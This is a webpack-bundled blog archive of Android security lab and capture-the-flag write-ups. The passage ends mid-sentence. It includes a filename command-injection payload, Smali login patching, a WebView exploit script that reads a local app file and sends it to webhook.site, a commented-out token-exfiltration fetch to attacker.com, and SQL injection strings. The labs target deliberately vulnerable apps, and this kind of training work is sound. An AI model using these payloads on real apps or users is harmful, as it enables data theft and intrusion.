"use strict";(self.webpackChunkmy_blog=self.webpackChunkmy_blog||[]).push([["5617"],{4261(e){e.exports=JSON.parse('{"archive":{"blogPosts":[{"id":"cyclic-mobile-hacking-lab","metadata":{"permalink":"/W0W/cyclic-mobile-hacking-lab","source":"@site/blog/2026-05-17-cyclic.md","title":"Cyclic - Mobile Hacking Lab","description":"{/ truncate /}","date":"2026-05-17T00:00:00.000Z","tags":[],"readingTime":3.78,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"cyclic-mobile-hacking-lab","title":"Cyclic - Mobile Hacking Lab","authors":["wesam"],"date":"2026-05-17T00:00:00.000Z"},"unlisted":false,"nextItem":{"title":"APKey - HTB Challenge","permalink":"/W0W/apkey-htb"}},"content":"{/* truncate */}\\r\\n\\r\\n### Objective\\r\\n\\r\\nExploit a vulnerability inherent within an Android service to achieve remote code execution.\\r\\n\\r\\n### Steps\\r\\n\\r\\n- When the app launches, it displays a single toggle switch labeled **\\"Enable Scanner\\"**. Enabling it shows: *\\"Scan service started, your device will be scanned regularly\\"* and forces the switch back ON. No other UI interaction exists, so the next step is static analysis.\\r\\n    \\r\\n    ![image.png](/img/m1.png)\\r\\n    \\r\\n- Decompiled the APK using JADX and started with `AndroidManifest.xml`:  we can see\\r\\n    \\r\\n```xml\\r\\n    <uses-permission android:name=\\"android.permission.MANAGE_EXTERNAL_STORAGE\\"/>\\r\\n    <uses-permission android:name=\\"android.permission.FOREGROUND_SERVICE\\"/>\\r\\n    \\r\\n    <activity\\r\\n        android:name=\\"com.mobilehackinglab.cyclicscanner.MainActivity\\"\\r\\n        android:exported=\\"true\\"/>\\r\\n    \\r\\n    <service\\r\\n        android:name=\\"com.mobilehackinglab.cyclicscanner.scanner.ScanService\\"\\r\\n        android:exported=\\"false\\"/>\\r\\n```\\r\\n    \\r\\n    - Only one activity: `MainActivity`\\r\\n    - `ScanService` is **not exported** can\'t be triggered directly via `adb`\\r\\n    - `MANAGE_EXTERNAL_STORAGE` \u2192 full access to `/storage/emulated/0`\\r\\n\\r\\n---\\r\\n\\r\\n- Moved to `MainActivity` to understand the switch behavior. Analyzed `setupSwitch$lambda$3()`:\\r\\n    \\r\\n```java\\r\\n    public static final void setupSwitch$lambda$3(MainActivity this$0, CompoundButton compoundButton, boolean isChecked) {\\r\\n        Intrinsics.checkNotNullParameter(this$0, \\"this$0\\");\\r\\n        if (isChecked) {\\r\\n            Toast.makeText(this$0, \\"Scan service started, your device will be scanned regularly.\\", 0).show();\\r\\n            this$0.startForegroundService(new Intent(this$0, (Class<?>) ScanService.class));\\r\\n            return;\\r\\n        }\\r\\n        Toast.makeText(this$0, \\"Scan service cannot be stopped, this is for your own safety!\\", 0).show();\\r\\n        ActivityMainBinding activityMainBinding = this$0.binding;\\r\\n        if (activityMainBinding == null) {\\r\\n            Intrinsics.throwUninitializedPropertyAccessException(\\"binding\\");\\r\\n            activityMainBinding = null;\\r\\n        }\\r\\n        activityMainBinding.serviceSwitch.setChecked(true);\\r\\n    }\\r\\n    \\r\\n    private final void startService() {\\r\\n        Toast.makeText(this, \\"Scan service started\\", 0).show();\\r\\n        startForegroundService(new Intent(this, (Class<?>) ScanService.class));\\r\\n    }\\r\\n```\\r\\n    \\r\\n    This confirms what we saw in the UI, switch ON launches `ScanService` as a foreground service, and switch OFF just forces it back ON via `activityMainBinding.serviceSwitch.setChecked(true);`, making it impossible to stop the service manually. Before showing the switch at all, `handlePermissions()` checks for `MANAGE_EXTERNAL_STORAGE`  if not granted it redirects to settings, if granted it shows the switch.\\r\\n\\r\\n---\\r\\n\\r\\n- Since `ScanService` is the core of the app, opened it next and analyzed `handleMessage()` inside `ServiceHandler`:\\r\\n    \\r\\n```java\\r\\n    File externalStorageDirectory = Environment.getExternalStorageDirectory();\\r\\n    Sequence files = FilesKt.walk(externalStorageDirectory);\\r\\n    \\r\\n    for (Object element : files) {\\r\\n        File file = (File) element;\\r\\n        if (file.canRead() && file.isFile()) {\\r\\n            boolean safe = ScanEngine.INSTANCE.scanFile(file);\\r\\n            System.out.println(safe ? \\"SAFE\\" : \\"INFECTED\\");\\r\\n        }\\r\\n    }\\r\\n    \\r\\n    sendMessageDelayed(nextMessage, SCAN_INTERVAL); // reschedule every 6000ms\\r\\n```\\r\\n    \\r\\n    - Walks **all files** recursively under `/storage/emulated/0` ,Then Every file gets passed to `ScanEngine.scanFile()` The service runs on a dedicated `HandlerThread` separate from the main thread so the scan loop runs in the background every 6 seconds without freezing the UI.\\r\\n\\r\\n---\\r\\n\\r\\n- This pointed directly to `ScanEngine` as the next class to investigate.\\r\\n    \\r\\n```java\\r\\n    String command = \\"toybox sha1sum \\" + file.getAbsolutePath();\\r\\n    Process process = new ProcessBuilder()\\r\\n        .command(\\"sh\\", \\"-c\\", command)\\r\\n        .directory(Environment.getExternalStorageDirectory())\\r\\n        .redirectErrorStream(true)\\r\\n        .start();\\r\\n    \\r\\n    String output = reader.readLine();\\r\\n    Object fileHash = StringsKt.substringBefore(output, \\"  \\");\\r\\n    return !KNOWN_MALWARE_SAMPLES.containsValue(fileHash);\\r\\n```\\r\\n    \\r\\n    Breaking down what this method does step by step:\\r\\n    \\r\\n    1. **Builds a shell command** by taking the file\'s absolute path and concatenating it directly into a `toybox sha1sum` command string. `toybox` is a collection of Unix utilities built into Android \u2014 here it\'s used to calculate the SHA1 hash of the file: \\r\\n        **`toybox sha1sum /storage/emulated/0/Download/test.txt`**\\r\\n    \\r\\n    2. **Executes it via `ProcessBuilder`** using `sh -c` meaning the entire string is handed to the shell to interpret and run. Critically, this is done without any sanitization on the filename before it gets passed to the shell making it vulnerable to command injection.\\r\\n    3. **Reads the output, extracts the hash, then compares it** against `KNOWN_MALWARE_SAMPLES` if the hash isn\'t in the list the file is marked `SAFE`, if it matches it\'s marked `INFECTED`.\\r\\n\\r\\n---\\r\\n\\r\\n- To confirm the scan service is working, created a test file in the scanned directory and watched logcat:\\r\\n    \\r\\n```bash\\r\\n    emu64x:/sdcard/Download # echo \\"test\\" > test.txt\\r\\n```\\r\\n    \\r\\n- Within 6 seconds the service picked it up and logged it as `SAFE` confirming that any file placed in external storage gets scanned automatically.\\r\\n    \\r\\n    ![image.png](/img/m2.png)\\r\\n\\r\\n---\\r\\n\\r\\n- With that confirmed, the next step is placing a file with a malicious name. Instead of normal content, the injection is in the **filename itself**\\r\\n    \\r\\n```bash\\r\\n    echo \\"test\\" > \\"/sdcard/Download/test2.txt;id>hacked.txt\\"\\r\\n```\\r\\n    \\r\\n- After 6 seconds, `hacked.txt` appears in the same directory containing the output of `id`  **RCE confirmed**.\\r\\n    \\r\\n    ![image.png](/img/m3.png)\\r\\n\\r\\n---\\r\\n\\r\\n<aside>\\r\\n\u{1F4A1}The root cause is unsanitized input passed to `sh -c` because the filename goes through the shell, any `;` in it gets interpreted as a command separator. The fix is to drop `sh -c` entirely and pass the arguments directly to `toybox` via `ProcessBuilder`, so the filename is never interpreted by a shell and is treated as a literal argument:\\r\\n\\r\\n```java\\r\\n// vulnerable \u2014 full string handed to sh, which interprets ; as a command separator\\r\\nnew ProcessBuilder()\\r\\n    .command(\\"sh\\", \\"-c\\", \\"toybox sha1sum \\" + file.getAbsolutePath())\\r\\n\\r\\n// safe \u2014 arguments passed directly to toybox, no shell involved, ; is just a character\\r\\nnew ProcessBuilder()\\r\\n    .command(\\"toybox\\", \\"sha1sum\\", file.getAbsolutePath())\\r\\n```\\r\\n\\r\\n</aside>"},{"id":"apkey-htb","metadata":{"permalink":"/W0W/apkey-htb","source":"@site/blog/2026-05-12_APKey-HTB.md","title":"APKey - HTB Challenge","description":"{/ truncate /}","date":"2026-05-16T00:00:00.000Z","tags":[],"readingTime":1.07,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"apkey-htb","title":"APKey - HTB Challenge","authors":["wesam"],"date":"2026-05-16T00:00:00.000Z"},"unlisted":false,"prevItem":{"title":"Cyclic - Mobile Hacking Lab","permalink":"/W0W/cyclic-mobile-hacking-lab"},"nextItem":{"title":"Cat - HTB","permalink":"/W0W/cat-htb"}},"content":"{/* truncate */}\\r\\n\\r\\n---\\r\\n\\r\\n## APKey HTB challenge\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/A1.png)\\r\\n\\r\\n\\r\\n### Solution\\r\\n\\r\\n- Opened the APK in JADX and analyzed `MainActivity`. Found the login logic in the `onClick()` handler:\\r\\n\\r\\n```java\\r\\nif (MainActivity.this.f928c.getText().toString().equals(\\"admin\\")) {\\r\\n    // ... MD5 hash of password ...\\r\\n    if (str.equals(\\"a2a3d412e92d896134d9c9126d756f\\")) {\\r\\n        makeText = Toast.makeText(applicationContext, b.a(g.a()), 1);\\r\\n        makeText.show();\\r\\n    }\\r\\n}\\r\\n```\\r\\n\\r\\n- First checks if username equals `\\"admin\\"`\\r\\n- Then computes MD5 of the entered password\\r\\n- Compares the hash against a hardcoded value: `a2a3d412e92d896134d9c9126d756f`\\r\\n- If match \u2192 shows the flag via `Toast`\\r\\n\\r\\n- Instead of cracking the MD5 hash, the plan is to flip the condition so any password passes.\\r\\n- To patch Smali, first needed to decompile APK, then navigate to the target Smali file and finally edit the onClick handler:\\r\\n\\r\\n```bash\\r\\napktool d APKey.apk -o output/\\r\\ncd output/smali/com/example/apkey/\\r\\nnano \'MainActivity$a.smali\'\\r\\n```\\r\\n\\r\\n- Located the hash comparison condition and flipped it: Original Check `if-eqz p1, :cond_1`, patched to `if-nez p1, :cond_1` \u2014 save and exit.\\r\\n- Recompile APK: `apktool b output/ -o patched.apk`\\r\\n- Sign new APK: `java -jar uber-apk-signer.jar --apks patched.apk --out signed/`\\r\\n- Remember to uninstall original, install patched:\\r\\n\\r\\n```bash\\r\\nadb uninstall com.example.apkey\\r\\nadb install signed/patched-aligned-signed.apk\\r\\n```\\r\\n\\r\\n### Result\\r\\n\\r\\n- Launched the app \u2192 entered `admin` as username + any random password\\r\\n- The condition now evaluates to `true` for any non-matching hash \u2192 flag displayed\\r\\n![image.png](/img/A2.png)"},{"id":"cat-htb","metadata":{"permalink":"/W0W/cat-htb","source":"@site/blog/2026-05-14-Cat-HTB.md","title":"Cat - HTB","description":"{/ truncate /}","date":"2026-05-14T00:00:00.000Z","tags":[],"readingTime":1.33,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"cat-htb","title":"Cat - HTB","authors":["wesam"],"date":"2026-05-14T00:00:00.000Z"},"unlisted":false,"prevItem":{"title":"APKey - HTB Challenge","permalink":"/W0W/apkey-htb"},"nextItem":{"title":"Beetlbug - Firebase","permalink":"/W0W/Beetlbug-Firebase"}},"content":"{/* truncate */}\\r\\n\\r\\n### Cat\\r\\n\\r\\n#### Objective\\r\\n\\r\\n- Analyze an Android Backup (`.ab`) file to extract sensitive data and retrieve a hidden flag.\\r\\n\\r\\n---\\r\\n\\r\\n#### What is an `.ab` File?\\r\\n\\r\\n- `.ab` = **Android Backup** \u2014 Android\'s native backup format, generated via `adb backup`\\r\\n- Internally it\'s a **ZLIB-compressed TAR archive** preceded by a plaintext header.\\r\\n    \\r\\n    ![image.png](/img/img1.png)\\r\\n    \\r\\n- Contains app data: `shared_prefs`, `databases`, `files`, and shared storage\\r\\n- Android backups created without encryption (`adb backup` without `-ky`) expose **all app data and shared storage** to anyone with access to the `.ab` file \u2014 no root required.\\r\\n\\r\\n---\\r\\n\\r\\n#### Extracting The Backup\\r\\n\\r\\n- Used [**android-backup-extractor**](https://github.com/nelenkov/android-backup-extractor) by [nelenkov](https://github.com/nelenkov) to unpack the `.ab` file:\\r\\n    \\r\\n    ```bash\\r\\n    java -jar abe-540a57d.jar unpack cat.ab cat.tar\\r\\n    tar -xvf cat.tar\\r\\n    ```\\r\\n    \\r\\n- The extraction produced two top-level directories:\\r\\n    - `apps/` \u2192 per-app backup data\\r\\n    - `shared/0/` \u2192 device\'s shared storage (equivalent to `/sdcard/`)\\r\\n\\r\\n---\\r\\n\\r\\n### Investigating `apps/`\\r\\n\\r\\n- Scanned all packages by size to identify non-system apps:\\r\\n    \\r\\n    ```bash\\r\\n    du -sh ~/Downloads/apps/* | sort -rh | head -20\\r\\n    ```\\r\\n    \\r\\n- All large packages were standard system apps (`com.android.*`, `com.google.*`) \u2014 not interesting.\\r\\n- Two packages had `com.example` prefix, meaning they\'re **user-installed apps**, not system:\\r\\n    - `com.example.android.notepad`\\r\\n    - `com.example.android.rssreader`\\r\\n- Investigated both:\\r\\n\\r\\n```bash\\r\\nfind ~/Downloads/apps/com.example.android.notepad/ -type f\\r\\nfind ~/Downloads/apps/com.example.android.rssreader/ -type f\\r\\n```\\r\\n\\r\\n- Each only had a `_manifest` file \u2014 **no** `sp/`, `db/`, or `f/` directories, meaning the backup captured the app\'s existence but **no actual user data was backed up** for either app.\\r\\n- So moved Shared folder, found only those 6 images viewed them and finally the flag was hidden inside one of them\\r\\n    \\r\\n    ![image.png](/img/img2.png)\\r\\n    \\r\\n- The flag is `HTB{ThisBackupIsUnprotected}`\\r\\n    \\r\\n    ![image.png](/img/img3.png)"},{"id":"Beetlbug-Firebase","metadata":{"permalink":"/W0W/Beetlbug-Firebase","source":"@site/blog/2026-04-28-Beetlebug.md","title":"Beetlbug - Firebase","description":"{/ truncate /}","date":"2026-05-08T00:00:00.000Z","tags":[],"readingTime":0.5,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"Beetlbug-Firebase","title":"Beetlbug - Firebase","authors":["wesam"],"date":"2026-05-08T00:00:00.000Z"},"unlisted":false,"prevItem":{"title":"Cat - HTB","permalink":"/W0W/cat-htb"},"nextItem":{"title":"Vuln_WebView","permalink":"/W0W/vulnwebview"}},"content":"{/* truncate */}\\r\\n### Objective:\\r\\n\\r\\n![image.png](/img/img4.png)\\r\\n\\r\\nIdentify and exploit a misconfigured Firebase Realtime Database to extract the hidden flag.\\r\\n\\r\\n### Steps:\\r\\n\\r\\n- **Decompile:** Used **JADX** to decompile the APK and began auditing the source code for Firebase configurations.\\r\\n- **Identify URL:** Located the hardcoded Firebase database URL within `res/values/strings.xml`:\\r\\n    \\r\\n    `https://beetlebug-374fc-default-rtdb.firebaseio.com/`\\r\\n    \\r\\n- **Verify Access:** Tested for public read permissions by appending **`/.json`** to the URL in a browser, forcing the server to return the database tree in JSON format.\\r\\n- **Extract Flag:** Successfully bypassed authentication due to misconfigured security rules and captured the flag: **`0x3365A10`**.\\r\\n    \\r\\n    ![image.png](/img/img5.png)"},{"id":"vulnwebview","metadata":{"permalink":"/W0W/vulnwebview","source":"@site/blog/2026-05-10-Vuln-WebView.md","title":"Vuln_WebView","description":"{/ truncate /}","date":"2026-05-08T00:00:00.000Z","tags":[{"inline":true,"label":"Android","permalink":"/W0W/tags/android"}],"readingTime":3.51,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"vulnwebview","title":"Vuln_WebView","authors":["wesam"],"date":"2026-05-08T00:00:00.000Z","tags":["Android"]},"unlisted":false,"prevItem":{"title":"Beetlbug - Firebase","permalink":"/W0W/Beetlbug-Firebase"},"nextItem":{"title":"DIVA - Damn Insecure and Vulnerable App","permalink":"/W0W/diva"}},"content":"{/* truncate */}\\r\\n\\r\\n### Objective\\r\\n\\r\\n- Exploit a misconfigured exported WebView activity to read sensitive local files from the app without a rooted device.\\r\\n\\r\\n#### `RegistrationWebView`\\r\\n\\r\\n- The first step was to review the `AndroidManifest.xml` using JADX to identify potential entry points. I searched for exported activities and found two candidates:\\r\\n    \\r\\n    ```xml\\r\\n    <activity\\r\\n        android:name=\\"com.tmh.vulnwebview.SupportWebView\\"\\r\\n        android:exported=\\"true\\"/>\\r\\n    <activity\\r\\n        android:name=\\"com.tmh.vulnwebview.RegistrationWebView\\"\\r\\n        android:exported=\\"true\\"/>\\r\\n    ```\\r\\n    \\r\\n- Found 2 exported WebView activities. Focused on `RegistrationWebView` first.\\r\\n- Opened `RegistrationWebView` in JADX and went to `onCreate()` \u2192 `loadWebView()`:\\r\\n    \\r\\n![image.png](/img/image1.png)    \\r\\n- **3 critical findings:**\\r\\n    \\r\\n    \\r\\n    | Finding | Impact |\\r\\n    | --- | --- |\\r\\n    | `setAllowUniversalAccessFromFileURLs(true)` | This is the most dangerous setting. When combined with JavaScript execution, it allows JS code running from a `file://` scheme context to access *other* local files via `file://` and, crucially, bypasses the Same-Origin Policy (SOP), allowing the script to send data to external HTTP/HTTPS domains. |\\r\\n    | `setJavaScriptEnabled(true)` | JS execution enabled in WebView \u2014> XSS |\\r\\n    | `reg_url` extra loaded directly | Attacker controls what the WebView loads |\\r\\n- **The `is_reg` logic:**\\r\\n    - `getBoolean(\\"is_reg\\", false)` \u2014 the `false` is the **default value.**\\r\\n    - If `is_reg` is not passed in the intent \u2192 defaults to `false` \u2192 loads **`reg_url**.` under our control as we pass it as extra string.\\r\\n    - If `is_reg = true` \u2192 loads internal `registration.html` (not useful)\\r\\n    - So we simply **don\'t pass `is_reg`** \u2192 WebView loads our controlled URL\\r\\n\\r\\n**Developing the Exploit Strategy**\\r\\n\\r\\n- we can craft a malicious local HTML file containing JavaScript to read content of sensitive files, then send it to external server under our control (like Webhook.site).\\r\\n    \\r\\n    ```jsx\\r\\n    <script>\\r\\n    var xhr = new XMLHttpRequest();   // reads the local file\\r\\n    var xhr2 = new XMLHttpRequest();  // sends the data out\\r\\n    \\r\\n    xhr.onreadystatechange = () => {\\r\\n        if (xhr.readyState === 4) {\\r\\n            // POST the file contents (Base64 encoded) to attacker\'s server\\r\\n            xhr2.open(\\"POST\\", \'https://webhook.site/YOUR-ID/exfil\');\\r\\n            xhr2.setRequestHeader(\\"Content-Type\\", \\"x-www-form-urlencoded\\");\\r\\n            xhr2.send(\'data=\' + btoa(xhr.responseText));\\r\\n        }\\r\\n    };\\r\\n    \\r\\n    // Target file to steal\\r\\n    xhr.open(\\"GET\\", \\"file:///data/data/com.tmh.vulnwebview/shared_prefs/MainActivity.xml\\", true);\\r\\n    xhr.send();\\r\\n    <\/script>\\r\\n    ```\\r\\n    \\r\\n- **Result:** we got the response, just decode it.\\r\\n    \\r\\n    ![image.png](/img/image2.png)\\r\\n    \\r\\n    ![image.png](/img/image3.png)\\r\\n    \\r\\n\\r\\n#### `SupportWebView`\\r\\n\\r\\n- While reviewing the `AndroidManifest.xml`, I identified another exported activity:\\r\\n    \\r\\n    ```xml\\r\\n    <activity\\r\\n        android:name=\\"com.tmh.vulnwebview.SupportWebView\\"\\r\\n        android:exported=\\"true\\"/>\\r\\n    ```\\r\\n    \\r\\n- analyzing the `SupportWebView` class in JADX, I examined the `loadWebView()` method and found several alarming configurations:\\r\\n    \\r\\n    ![image.png](/img/image4.png)\\r\\n    \\r\\n    - **Arbitrary URL Loading:** The WebView loads whatever URL is provided in the `support_url` intent extra, giving an attacker full control over the displayed content.\\r\\n    - **`setJavaScriptEnabled(true)`:** JavaScript execution is allowed.\\r\\n    - **Insecure `JavascriptInterface`:** This grants any JavaScript executing in the WebView direct access to call the exposed Java methods of the `WebAppInterface` class.\\r\\n- I inspected the `WebAppInterface` class to see what methods were exposed to the web context. I found the following method annotated with `@JavascriptInterface`:\\r\\n    \\r\\n    ```java\\r\\n    @JavascriptInterface\\r\\n    public String getUserToken() {\\r\\n        return SupportWebView.getUserToken();\\r\\n    }\\r\\n    ```\\r\\n    \\r\\n- This means any JavaScript code running inside that WebView can simply call `Android.getUserToken()` to retrieve the user\'s UUID token.\\r\\n- Since we control the URL via `support_url`, we can point the WebView to a local HTML file containing our malicious JavaScript. The script will access the exposed native object, call the method, and capture the token.\\r\\n    \\r\\n    ```java\\r\\n    <!DOCTYPE html>\\r\\n    <html>\\r\\n    <body>\\r\\n        <h2>Stealing Token via JavascriptInterface</h2>\\r\\n        <script>\\r\\n            // Note the capital \'A\' matching the interface name defined in Java\\r\\n            var token = Android.getUserToken();\\r\\n            alert(\\"App Compromised! Token: \\" + token);\\r\\n            document.write(\\"<h1>Stolen Token: \\" + token + \\"</h1>\\");\\r\\n            \\r\\n            // In a real-world scenario, we would exfiltrate it:\\r\\n            // fetch(\'https://attacker.com/log?token=\' + token);\\r\\n        <\/script>\\r\\n    </body>\\r\\n    </html>\\r\\n    ```\\r\\n    \\r\\n- I pushed the payload to the device and used `adb` to invoke the exported activity, passing the path to our local file in the `support_url` extra:\\r\\n    \\r\\n    ```bash\\r\\n    **# Push the payload\\r\\n    adb push test.html /sdcard/\\r\\n    \\r\\n    # Trigger the vulnerable activity\\r\\n    adb shell am start -n com.tmh.vulnwebview/.SupportWebView \\\\\\r\\n      --es \\"support_url\\" \\"file:///sdcard/test.html\\"**\\r\\n    ```\\r\\n    \\r\\n    ![image.png](/img/image5.png)\\r\\n    \\r\\n\\r\\n### Another Vulnerability may arise in webView\\r\\n\\r\\n#### `setWebContentsDebuggingEnabled`\\r\\n\\r\\n- A developer setting that enables **remote debugging of WebView** via Chrome DevTools from any machine on the same network\\r\\n- Enabled by: `WebView.setWebContentsDebuggingEnabled(true)`\\r\\n\\r\\n---\\r\\n\\r\\n#### How to Access It\\r\\n\\r\\n![image.png](/img/image6.png)\\r\\n\\r\\n- Open Chrome \u2192 go to `chrome://inspect/#devices`\\r\\n- You\'ll see the device and WebView listed \u2192 click **inspect**\\r\\n- Full Chrome DevTools opens connected live to the WebView\\r\\n\\r\\n---\\r\\n\\r\\n#### What You Can Do\\r\\n\\r\\n- **Console tab** \u2192 run any JS directly on the device\\r\\n- **Elements tab** \u2192 view and modify the DOM\\r\\n- **Network tab** \u2192 see all network requests\\r\\n- **Sources tab** \u2192 view loaded files and scripts"},{"id":"diva","metadata":{"permalink":"/W0W/diva","source":"@site/blog/2026-4-20-DIVA.md","title":"DIVA - Damn Insecure and Vulnerable App","description":"DIVA is an intentionally vulnerable Android app covering 5 categories: Insecure Logging, Hardcoding Issues, Input Validation Issues, Insecure Data Storage, and Access Control.","date":"2026-05-03T00:00:00.000Z","tags":[{"inline":true,"label":"Android","permalink":"/W0W/tags/android"}],"readingTime":9.68,"hasTruncateMarker":true,"authors":[{"name":"Wesam Abdelaziz","title":"Penetration Tester","description":"Breaking Web & Mobile apps, Taking notes, Repeat.","url":"https://github.com/wesam98","page":{"permalink":"/W0W/authors/wesam"},"socials":{"github":"https://github.com/wesam98","linkedin":"https://www.linkedin.com/in/wesam-abd-el-aziz-224b3a245/"},"imageURL":"/W0W/img/profile.jpg","key":"wesam"}],"frontMatter":{"slug":"diva","title":"DIVA - Damn Insecure and Vulnerable App","authors":["wesam"],"date":"2026-05-03T00:00:00.000Z","tags":["Android"]},"unlisted":false,"prevItem":{"title":"Vuln_WebView","permalink":"/W0W/vulnwebview"},"nextItem":{"title":"FortiClient VPN - Credential Exposure","permalink":"/W0W/forticlient-vpn"}},"content":"DIVA is an intentionally vulnerable Android app covering 5 categories: Insecure Logging, Hardcoding Issues, Input Validation Issues, Insecure Data Storage, and Access Control.\\r\\n\\r\\n{/* truncate */}\\r\\n\\r\\n---\\r\\n\\r\\n## 1. Insecure Logging\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/d1.png)\\r\\n\\r\\n### Solution\\r\\n\\r\\n- After decompiling the APK using APKLab in VS Code, I analyzed the Java source code of this challenge and found that the developer used `Log.e()` to log errors along with the credit card number entered by the user.\\r\\n![image.png](/img/d2.png)\\r\\n\\r\\n- To confirm this from a different angle, I used a second approach \u2014 I entered a credit card number directly in the app and got an error message. I then searched for that error message in the decompiled Java code and found the same vulnerable code, confirming the finding through both static and dynamic analysis.\\r\\n![image.png](/img/d3.png)\\r\\n\\r\\n- Now knowing that `Log.e()` writes the credit card number to logcat, I needed to capture those logs. Since logcat output is very long, I first got the PID of the DIVA application to filter only its logs:\\r\\n\\r\\n```bash\\r\\nadb shell pidof jakhar.aseem.diva\\r\\n# package name can be found in AndroidManifest.xml\\r\\n```\\r\\n\\r\\n- Then I filtered logcat by the app\'s PID: `adb logcat --pid=4423`\\r\\n- The credit card number appeared in the logs, confirming the insecure logging vulnerability.\\r\\n![image.png](/img/d4.png)\\r\\n\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 2. Hardcoding Issues - Part 1\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/d5.png)\\r\\n\\r\\n### Solution\\r\\n\\r\\n- I directly analyzed the Java source code of this challenge:\\r\\n\\r\\n```java\\r\\npublic void access(View view) {\\r\\n    EditText hckey = (EditText) findViewById(R.id.hcKey);\\r\\n    if (hckey.getText().toString().equals(\\"vendorsecretkey\\")) {\\r\\n        Toast.makeText(this, \\"Access granted! See you on the other side :)\\", 0).show();\\r\\n    } else {\\r\\n        Toast.makeText(this, \\"Access denied! See you in hell :D\\", 0).show();\\r\\n    }\\r\\n}\\r\\n```\\r\\n\\r\\n- This function takes the user input from the text field `hcKey` and compares it directly against the hardcoded string `\\"vendorsecretkey\\"`. If it matches \u2192 Access granted, otherwise \u2192 Access denied.\\r\\n- The secret key `vendorsecretkey` is hardcoded directly in the source code \u2014 meaning anyone who decompiles the APK using JADX can extract it instantly without any reverse engineering effort.\\r\\n- I entered the extracted key directly in the app and got access granted.\\r\\n![image.png](/img/d6.png)\\r\\n\\r\\n\\r\\n---\\r\\n\\r\\n## 2. Hardcoding Issues - Part 2\\r\\n\\r\\n### Objective\\r\\n\\r\\n![image.png](/img/d7.png)\\r\\n\\r\\n### Solution\\r\\n\\r\\n- After analyzing the Java source code, I found the `access()` function which takes user input and passes it to `this.djni.access()` for validation:\\r\\n\\r\\n```java\\r\\npublic void access(View view) {\\r\\n    EditText hckey = (EditText) findViewById(R.id.hc2Key);\\r\\n    if (this.djni.access(hckey.getText().toString()) != 0) {\\r\\n        Toast.makeText(this, \\"Access granted!\\", 0).show();\\r\\n    } else {\\r\\n        Toast.makeText(this, \\"Access denied!\\", 0).show();\\r\\n    }\\r\\n}\\r\\n```\\r\\n\\r\\n- The function takes user input from `hc2Key`, passes it to `this.djni.access()` for validation. If the function returns anything other than `0` \u2192 Access granted, if it returns `0` \u2192 Access denied.\\r\\n\\r\\n- I then traced `djni` to the `DivaJni` class and found that the actual validation logic is a native method implemented in a compiled C/C++ library `libdivajni.so`:\\r\\n\\r\\n```java\\r\\npublic class DivaJni {\\r\\n    private static final String soName = \\"divajni\\";\\r\\n\\r\\n    // declared as native \u2014 implementation is inside libdivajni.so\\r\\n    public native int access(String str);\\r\\n\\r\\n    static {\\r\\n        System.loadLibrary(soName); // loads libdivajni.so at runtime\\r\\n    }\\r\\n}\\r\\n```\\r\\n\\r\\n- Since the logic is inside a compiled binary that JADX can\'t read, I extracted the `.so` file from the APK and used the `strings` command to extract any readable text embedded in the binary:\\r\\n\\r\\n```bash\\r\\nstrings lib/x86/libdivajni.so\\r\\n```\\r\\n\\r\\n- Among the output, I spotted a suspicious random string: `olsdfgad;lh`\\r\\n![image.png](/img/d8.png)\\r\\n- I entered it as the key in the app and got access granted, confirming it was the hardcoded secret key hidden inside the native library.\\r\\n![image.png](/img/d10.png)\\r\\n- OR using `Ghidra` for reversing.\\r\\n![image.png](/img/d9.png)\\r\\n<div style={{borderTop: \'3px solid #25c2a0\', margin: \'40px 0\'}} />\\r\\n\\r\\n## 3. Input Validation Issues - Part 1\\r\\n\\r\\n### Objective\\r\\n![image.png](/img/d11.png)\\r\\n\\r\\n### Solution\\r\\n\\r\\n- After analyzing the Java source code, I spotted the vulnerability \u2014 the app inserts user input directly into a SQL query without any sanitization.\\r\\n![image.png](/img/d12.png)\\r\\n- The query directly concatenates user input into the SQL statement, making it vulnerable to SQL injection.\\r\\n- I used the following payload to retrieve all users data: `\' OR 1=1--`\\r\\n  - This closes the original query with `\'`, adds `OR 1=1` which is always true returning all rows, then `--` comments out the rest of the query.\\r\\n- The final query executed becomes: `SELECT * FROM sqliuser WHERE user = \'\' OR 1=1--\'`\\r\\n- All users data was returned including usernames, passwords and credit card 